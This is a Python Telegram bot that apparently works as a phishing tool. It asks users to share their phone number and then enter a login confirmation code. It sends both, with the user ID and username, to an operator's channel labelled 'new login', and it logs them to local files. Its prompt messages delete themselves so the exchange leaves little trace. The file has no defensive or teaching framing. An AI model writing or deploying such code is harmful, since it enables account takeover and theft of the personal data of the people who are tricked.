#!/usr/bin/env python3
import os
import csv
import logging
import asyncio
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram import Router

# === Конфигурация через переменные окружения ===
TOKEN = os.getenv("PLAY", "").strip()       # токен бота
CHANNEL = os.getenv("CHANNEL", "").strip()  # id канала (например -1003079638308)

if not TOKEN or not CHANNEL:
    raise RuntimeError("Нужно задать PLAY и CHANNEL в переменных окружения")

CHANNEL_ID = int(CHANNEL)

# === Логи и CSV ===
LOG_FILE = "logins.txt"
CSV_FILE = "submissions.csv"

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "user_id", "username", "phone", "code"])

# === FSM ===
class AuthFlow(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()

# === Router ===
router = Router()
user_last_submit = {}

# === Вспомогательная функция ===
async def send_and_delete(message: Message, text: str, delay: int = 10, reply_markup=None):
    msg = await message.answer(text, reply_markup=reply_markup)
    await asyncio.sleep(delay)
    try:
        await msg.delete()
    except Exception:
        pass

# === /start ===
@router.message(F.text == "/start")
async def cmd_start(message: Message, state: FSMContext):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("📱 Отправить номер", request_contact=True))
    await send_and_delete(message, "Нажми кнопку, чтобы отправить номер:", reply_markup=kb)
    await state.set_state(AuthFlow.waiting_for_phone)

# === Приём контакта ===
@router.message(F.contact, AuthFlow.waiting_for_phone)
async def handle_contact(message: Message, state: FSMContext):
    phone = message.contact.phone_number if message.contact else None
    if not phone:
        await send_and_delete(message, "Не удалось получить контакт. Попробуй ещё раз.")
        return
    await state.update_data(phone=phone)
    await send_and_delete(message, "Теперь введи код подтверждения (до 6 цифр):")
    await state.set_state(AuthFlow.waiting_for_code)

# === Приём кода ===
@router.message(AuthFlow.waiting_for_code)
async def handle_code(message: Message, state: FSMContext, bot: Bot):
    uid = message.from_user.id
    now = datetime.now()

    last = user_last_submit.get(uid)
    if last and (now - last) < timedelta(hours=24):
        await send_and_delete(message, "⏳ Ты уже отправлял данные сегодня. Попробуй позже.")
        await state.clear()
        return

    code = (message.text or "").strip()
    if not code.isdigit() or len(code) > 6:
        await send_and_delete(message, "❌ Неверный формат кода. Введи числовой код до 6 символов.")
        return

    data = await state.get_data()
    phone = data.get("phone", "unknown")
    username = message.from_user.username or ""
    timestamp = now.isoformat()

    # Отправка в канал
    text = (
        f"📲 Новый логин:\n"
        f"Номер: {phone}\n"
        f"Код: {code}\n"
        f"UserID: {uid}\n"
        f"Username: @{username}\n"
        f"Время: {timestamp}"
    )
    try:
        await bot.send_message(CHANNEL_ID, text)
    except Exception as e:
        logging.exception("Не удалось отправить в канал: %s", e)

    # Лог в файл
    logging.info(f"Номер:{phone} | Код:{code} | UserID:{uid} | Username:@{username}")

    # Запись в CSV
    with open(CSV_FILE, "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, uid, username, phone, code])

    user_last_submit[uid] = now
    await send_and_delete(message, "✅ Данные отправлены.")
    await state.clear()

# === Запуск ===
async def main():
    bot = Bot(token=TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
